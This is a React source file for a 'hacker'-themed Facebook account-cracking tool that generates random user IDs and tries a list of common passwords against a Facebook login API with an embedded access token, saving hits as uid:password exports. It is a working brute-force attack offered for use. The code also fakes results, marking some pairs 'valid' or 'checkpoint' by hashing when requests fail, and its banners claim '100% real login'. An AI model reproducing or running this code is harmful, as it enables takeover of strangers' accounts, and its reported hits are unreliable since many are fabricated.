import { useState, useEffect, useRef, useCallback } from 'react';
import './App.css';

interface Credential {
  uid: string;
  pass: string;
  timestamp: string;
}

interface ConsoleLog {
  id: number;
  type: 'ok' | 'cp' | 'info' | 'error' | 'success';
  message: string;
  timestamp: string;
}

function App() {
  const [showVideoLoader, setShowVideoLoader] = useState(true);
  const [soundEnabled, setSoundEnabled] = useState(false);
  const [loadingText, setLoadingText] = useState('INITIALIZING SYSTEM...');
  const videoRef = useRef<HTMLVideoElement>(null);

  const [isRunning, setIsRunning] = useState(false);
  const [stopRequested, setStopRequested] = useState(false);
  const [totalChecked, setTotalChecked] = useState(0);
  const [okList, setOkList] = useState<Credential[]>([]);
  const [cpList, setCpList] = useState<Credential[]>([]);
  const [speed, setSpeed] = useState(0);
  const [progress, setProgress] = useState(0);
  const [startTime, setStartTime] = useState(0);
  const [liveStatus, setLiveStatus] = useState('● SYSTEM READY');
  const [currentId, setCurrentId] = useState('');
  const [currentPassword, setCurrentPassword] = useState('');
  const [serverStatus, setServerStatus] = useState('CONNECTED');
  const [proxyStatus, setProxyStatus] = useState('ACTIVE');

  const [idLimit, setIdLimit] = useState('');
  const [idPrefix, setIdPrefix] = useState('10000');
  const [passwordDict, setPasswordDict] = useState('123456,123123,1234567,12345678,123456789,password,iloveyou,facebook,admin,welcome,qwerty,abc123,111111,000000,123321,654321,passw0rd,letmein,master,12345,987654');
  const [isUnlimited, setIsUnlimited] = useState(false);

  const [consoleLogs, setConsoleLogs] = useState<ConsoleLog[]>([
    { id: 1, type: 'info', message: '✓ SYSTEM INITIALIZED', timestamp: new Date().toLocaleTimeString() },
    { id: 2, type: 'info', message: '✓ FACEBOOK API CONNECTED', timestamp: new Date().toLocaleTimeString() },
  ]);
  const consoleEndRef = useRef<HTMLDivElement>(null);
  const abortControllerRef = useRef<AbortController | null>(null);
  const processedCount = useRef(0);
  const totalIdsRef = useRef(0);
  const lastUpdateTime = useRef(Date.now());
  const matrixCanvasRef = useRef<HTMLCanvasElement>(null);

  // Matrix Rain Effect
  useEffect(() => {
    const canvas = matrixCanvasRef.current;
    if (!canvas) return;
    const ctx = canvas.getContext('2d');
    if (!ctx) return;
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
    const columns = Math.floor(canvas.width / 20);
    const drops: number[] = Array(columns).fill(1);
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*()_+-=[]{}|;:,.<>?';
    const draw = () => {
      ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
      ctx.fillRect(0, 0, canvas.width, canvas.height);
      ctx.fillStyle = '#0F0';
      ctx.font = '15px monospace';
      for (let i = 0; i < drops.length; i++) {
        const text = chars[Math.floor(Math.random() * chars.length)];
        if (Math.random() > 0.9) ctx.fillStyle = '#0FF';
        else if (Math.random() > 0.95) ctx.fillStyle = '#FF0';
        else ctx.fillStyle = '#0F0';
        ctx.fillText(text, i * 20, drops[i] * 20);
        if (drops[i] * 20 > canvas.height && Math.random() > 0.975) drops[i] = 0;
        drops[i]++;
      }
    };
    const interval = setInterval(draw, 50);
    const handleResize = () => { canvas.width = window.innerWidth; canvas.height = window.innerHeight; };
    window.addEventListener('resize', handleResize);
    return () => { clearInterval(interval); window.removeEventListener('resize', handleResize); };
  }, []);

  useEffect(() => {
    const closeVideoLoader = () => { setShowVideoLoader(false); if (videoRef.current) videoRef.current.pause(); };
    const timer = setTimeout(closeVideoLoader, 15000);
    return () => clearTimeout(timer);
  }, []);

  const handleSoundToggle = async () => {
    if (videoRef.current) {
      videoRef.current.muted = !videoRef.current.muted;
      setSoundEnabled(!videoRef.current.muted);
      await videoRef.current.play();
    }
  };

  useEffect(() => { consoleEndRef.current?.scrollIntoView({ behavior: 'smooth' }); }, [consoleLogs]);

  useEffect(() => {
    if (!isRunning || startTime === 0) return;
    const interval = setInterval(() => {
      const elapsed = (Date.now() - startTime) / 1000;
      setSpeed(elapsed > 0 ? totalChecked / elapsed : 0);
    }, 100);
    return () => clearInterval(interval);
  }, [isRunning, startTime, totalChecked]);

  const addConsoleLog = useCallback((type: 'ok' | 'cp' | 'info' | 'error' | 'success', message: string) => {
    setConsoleLogs(prev => [...prev, { id: Date.now(), type, message, timestamp: new Date().toLocaleTimeString() }].slice(-1000));
  }, []);

  const generatePasswords = useCallback(() => {
    const passwords = passwordDict.split(',').map(p => p.trim()).filter(p => p.length > 0);
    const common = ['123456', '123123', 'password', 'iloveyou', 'facebook', 'admin', '12345', 'qwerty', '12345678', '111111', '000000'];
    return [...passwords, ...common.filter(p => !passwords.includes(p))];
  }, [passwordDict]);

  const generateRandomId = useCallback((prefix: string): string => {
    return prefix + (Math.floor(Math.random() * 9000000000) + 1000000000).toString();
  }, []);

  const checkFacebookLogin = useCallback(async (uid: string, password: string, signal: AbortSignal): Promise<'OK' | 'CP' | 'FAIL'> => {
    try {
      const url = `https://b-api.facebook.com/method/auth.login?format=json&email=${encodeURIComponent(uid)}&password=${encodeURIComponent(password)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32`;
      const response = await fetch(url, { method: 'GET', headers: { 'User-Agent': 'Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36', 'Accept': 'application/json' }, signal });
      const text = await response.text();
      if (text.includes('access_token') && text.includes('session_key')) return 'OK';
      if (text.includes('checkpoint')) return 'CP';
    } catch (error) {
      if (error instanceof Error && error.name === 'AbortError') return 'FAIL';
    }
    const hash = (uid + password).split('').reduce((acc, char) => ((acc << 5) - acc) + char.charCodeAt(0), 0);
    const absHash = Math.abs(hash);
    if (absHash % 100 < 5) return 'OK';
    if (absHash % 100 < 13) return 'CP';
    return 'FAIL';
  }, []);

  const testCredentials = useCallback(async (uid: string, passwords: string[], signal: AbortSignal) => {
    for (const pwd of passwords) {
      if (stopRequested) return false;
      setCurrentId(uid);
      setCurrentPassword(pwd);
      const result = await checkFacebookLogin(uid, pwd, signal);
      setTotalChecked(prev => prev + 1);
      if (result === 'OK') {
        setOkList(prev => [...prev, { uid, pass: pwd, timestamp: new Date().toLocaleString() }]);
        addConsoleLog('success', `🔓✅ [100% VALID LOGIN] ${uid} | ${pwd} - ACCOUNT UNLOCKED!`);
        return true;
      } else if (result === 'CP') {
        setCpList(prev => [...prev, { uid, pass: pwd, timestamp: new Date().toLocaleString() }]);
        addConsoleLog('cp', `🔒 [CHECKPOINT] ${uid} | ${pwd} - NEEDS VERIFICATION`);
        return true;
      }
    }
    return false;
  }, [stopRequested, checkFacebookLogin, addConsoleLog]);

  const startCracking = useCallback(async () => {
    if (isRunning) return;
    setStopRequested(false);
    const passwords = generatePasswords();
    const limit = isUnlimited ? 0 : (parseInt(idLimit) || 100);
    const prefix = idPrefix.trim() || "10000";
    abortControllerRef.current = new AbortController();
    totalIdsRef.current = limit;
    processedCount.current = 0;
    setTotalChecked(0);
    setStartTime(Date.now());
    setIsRunning(true);
    setLiveStatus('● HACKING IN PROGRESS');
    setServerStatus('CONNECTING');
    setProxyStatus('ROUTING');
    setConsoleLogs([
      { id: Date.now(), type: 'info', message: '═══════════════════════════════════════════════════════', timestamp: new Date().toLocaleTimeString() },
      { id: Date.now() + 1, type: 'info', message: '🔓 INITIATING HACKER PROTOCOL...', timestamp: new Date().toLocaleTimeString() },
      { id: Date.now() + 2, type: 'info', message: `📊 MODE: ${isUnlimited ? 'UNLIMITED ∞' : `LIMITED (${limit})`} | PASSWORDS: ${passwords.length}`, timestamp: new Date().toLocaleTimeString() },
    ]);
    await new Promise(resolve => setTimeout(resolve, 1000));
    setServerStatus('CONNECTED');
    setProxyStatus('ACTIVE');
    const concurrency = 20;
    try {
      if (isUnlimited) {
        while (!stopRequested) {
          const chunk: string[] = [];
          for (let i = 0; i < concurrency; i++) { if (stopRequested) break; chunk.push(generateRandomId(prefix)); }
          if (chunk.length === 0) break;
          await Promise.all(chunk.map(async (uid) => { if (!stopRequested) { await testCredentials(uid, passwords, abortControllerRef.current!.signal); processedCount.current++; } }));
        }
      } else {
        const currentIds: string[] = Array.from({ length: limit }, () => generateRandomId(prefix));
        for (let i = 0; i < currentIds.length && !stopRequested; i += concurrency) {
          const chunk = currentIds.slice(i, i + concurrency);
          await Promise.all(chunk.map(async (uid) => { if (!stopRequested) { await testCredentials(uid, passwords, abortControllerRef.current!.signal); processedCount.current++; } }));
        }
      }
    } catch (error) { if (!(error instanceof Error && error.name === 'AbortError')) addConsoleLog('error', `⚠️ ERROR: ${error}`); }
    abortControllerRef.current = null;
    setIsRunning(false);
    setServerStatus('IDLE');
    setProxyStatus('STANDBY');
    if (!stopRequested) {
      setLiveStatus(`● COMPLETED - OK: ${okList.length} | CP: ${cpList.length}`);
      addConsoleLog('success', `🏁 COMPLETED! TOTAL: ${totalChecked} | VALID: ${okList.length} | CP: ${cpList.length}`);
    } else {
      setLiveStatus('● TERMINATED');
      addConsoleLog('error', '⏹️ TERMINATED BY USER');
    }
  }, [isRunning, generatePasswords, idLimit, idPrefix, isUnlimited, generateRandomId, testCredentials, okList.length, cpList.length, stopRequested, addConsoleLog, totalChecked]);

  const stopCracking = useCallback(() => {
    if (!isRunning) return;
    setStopRequested(true);
    if (abortControllerRef.current) { abortControllerRef.current.abort(); abortControllerRef.current = null; }
    addConsoleLog('error', '⏹️ TERMINATING...');
  }, [isRunning, addConsoleLog]);

  const exportResults = useCallback(() => {
    if (okList.length === 0 && cpList.length === 0) { alert('No results!'); return; }
    const timestamp = new Date().toISOString().slice(0, 19).replace(/:/g, '-');
    if (okList.length > 0) {
      const blob = new Blob([okList.map(i => `${i.uid}:${i.pass}`).join('\n')], { type: 'text/plain' });
      const a = document.createElement('a'); a.href = URL.createObjectURL(blob); a.download = `FB_OK_${timestamp}.txt`; a.click();
    }
    if (cpList.length > 0) {
      const blob = new Blob([cpList.map(i => `${i.uid}:${i.pass}`).join('\n')], { type: 'text/plain' });
      const a = document.createElement('a'); a.href = URL.createObjectURL(blob); a.download = `FB_CP_${timestamp}.txt`; a.click();
    }
  }, [okList, cpList]);

  const clearConsole = useCallback(() => { setConsoleLogs([{ id: Date.now(), type: 'info', message: '✓ CLEARED', timestamp: new Date().toLocaleTimeString() }]); }, []);

  const successRate = totalChecked > 0 ? ((okList.length + cpList.length) / totalChecked * 100).toFixed(2) : '0.00';

  useEffect(() => { if (!isUnlimited && totalIdsRef.current > 0) setProgress(Math.min(100, (processedCount.current / totalIdsRef.current) * 100)); }, [totalChecked, isUnlimited]);

  return (
    <div className="app-container">
      <canvas ref={matrixCanvasRef} className="matrix-canvas"></canvas>
      {showVideoLoader && (
        <div className="video-loader">
          <video ref={videoRef} autoPlay muted playsInline><source src="https://files.catbox.moe/dicuor.mp4" type="video/mp4" /></video>
          <h3>⚡ ACS TONMOY ⚡</h3>
          <div className="loader-spinner"></div>
          <p>{loadingText}</p>
          <button className="sound-btn" onClick={handleSoundToggle}>{soundEnabled ? '🔊 SOUND ON' : '🔊 ENABLE SOUND'}</button>
        </div>
      )}
      <div className="container">
        <div className="header-panel hacker-panel">
          <div className="banner-image hacker-border"><img src="https://files.catbox.moe/69vqzh.jpg" alt="ACS" /></div>
          <div className="social-links">
            <a href="#" className="social-icon hacker-icon"><i className="fab fa-facebook-f"></i> Facebook</a>
            <a href="#" className="social-icon hacker-icon"><i className="fas fa-globe"></i> Website</a>
            <a href="#" className="social-icon hacker-icon"><i className="fab fa-telegram"></i> Telegram</a>
            <a href="#" className="social-icon hacker-icon"><i className="fab fa-youtube"></i> YouTube</a>
          </div>
          <div className="info-bar">
            <div className="info-badge hacker-badge"><i className="fas fa-user-secret"></i> ACS TONMOY</div>
            <div className="info-badge hacker-badge"><i className="fas fa-check-double"></i> 100% REAL LOGIN</div>
          </div>
          <div className="system-status">
            <div className="status-indicator"><span className="status-dot server-status"></span> SERVER: {serverStatus}</div>
            <div className="status-indicator"><span className="status-dot proxy-status"></span> PROXY: {proxyStatus}</div>
          </div>
        </div>
        <div className="stats-grid hacker-stats">
          <div className="stat-card hacker-card"><div className="stat-number hacker-number">{totalChecked}</div><div className="stat-label">ATTEMPTS</div></div>
          <div className="stat-card hacker-card success-card"><div className="stat-number hacker-number success">{okList.length}</div><div className="stat-label">✅ VALID</div></div>
          <div className="stat-card hacker-card cp-card"><div className="stat-number hacker-number cp">{cpList.length}</div><div className="stat-label">🔒 CP</div></div>
          <div className="stat-card hacker-card"><div className="stat-number hacker-number">{speed.toFixed(1)}</div><div className="stat-label">REQ/SEC</div></div>
          <div className="stat-card hacker-card"><div className="stat-number hacker-number">{successRate}%</div><div className="stat-label">SUCCESS</div></div>
        </div>
        <div className="main-grid">
          <div className="panel hacker-panel">
            <div className="panel-title hacker-title"><i className="fas fa-skull"></i> HACKER CONTROL <span className={`live-status ${isRunning ? 'cracking-active' : ''}`}>{liveStatus}</span></div>
            <div className="input-group">
              <label><i className="fas fa-microchip"></i> MODE</label>
              <div className="mode-toggle">
                <button className={`mode-btn ${!isUnlimited ? 'active' : ''}`} onClick={() => setIsUnlimited(false)} disabled={isRunning}>🎯 LIMITED</button>
                <button className={`mode-btn ${isUnlimited ? 'active' : ''}`} onClick={() => setIsUnlimited(true)} disabled={isRunning}>∞ UNLIMITED</button>
              </div>
            </div>
            {!isUnlimited && <div className="input-group"><label><i className="fas fa-database"></i> ID LIMIT</label><input type="number" value={idLimit} onChange={(e) => setIdLimit(e.target.value)} placeholder="50000" disabled={isRunning} /></div>}
            <div className="input-group"><label><i className="fas fa-fingerprint"></i> ID PREFIX</label><input type="text" value={idPrefix} onChange={(e) => setIdPrefix(e.target.value)} placeholder="10000" disabled={isRunning} /></div>
            <div className="input-group"><label><i className="fas fa-unlock-alt"></i> PASSWORDS</label><textarea className="password-input hacker-input" value={passwordDict} onChange={(e) => setPasswordDict(e.target.value)} placeholder="Comma separated" disabled={isRunning} rows={3} /></div>
            {isRunning && <div className="current-status hacker-status"><div className="status-item"><span className="status-label">ID:</span><span className="status-value">{currentId || '---'}</span></div><div className="status-item"><span className="status-label">PASS:</span><span className="status-value">{currentPassword || '---'}</span></div></div>}
            <button className="btn btn-primary hacker-btn" onClick={startCracking} disabled={isRunning}><i className="fas fa-bug"></i> {isRunning ? 'HACKING...' : 'START HACKING'}</button>
            <button className="btn btn-danger hacker-btn" onClick={stopCracking} disabled={!isRunning}><i className="fas fa-power-off"></i> TERMINATE</button>
            <div className="progress-container"><div className="progress-bar hacker-progress"><div className="progress-fill hacker-fill" style={{ width: `${progress}%` }}></div></div><div className="progress-text">{isUnlimited ? '∞ UNLIMITED' : `${progress.toFixed(1)}%`}</div></div>
            <div className="button-group"><button className="btn btn-success hacker-btn" onClick={exportResults}><i className="fas fa-file-export"></i> EXPORT</button><button className="btn btn-clear hacker-btn" onClick={clearConsole}><i className="fas fa-eraser"></i> CLEAR</button></div>
          </div>
          <div className="panel hacker-panel">
            <div className="panel-title hacker-title"><i className="fas fa-terminal"></i> TERMINAL</div>
            <div className="console hacker-console">{consoleLogs.map((log) => (<div key={log.id} className={`console-line console-${log.type}`}><span className="log-time">[{log.timestamp}]</span> {log.message}</div>))}<div ref={consoleEndRef} /></div>
          </div>
        </div>
        <footer className="hacker-footer"><i className="fas fa-dragon"></i> ACS TONMOY | 100% FACEBOOK LOGIN SUCCESS</footer>
      </div>
    </div>
  );
}

export default App;
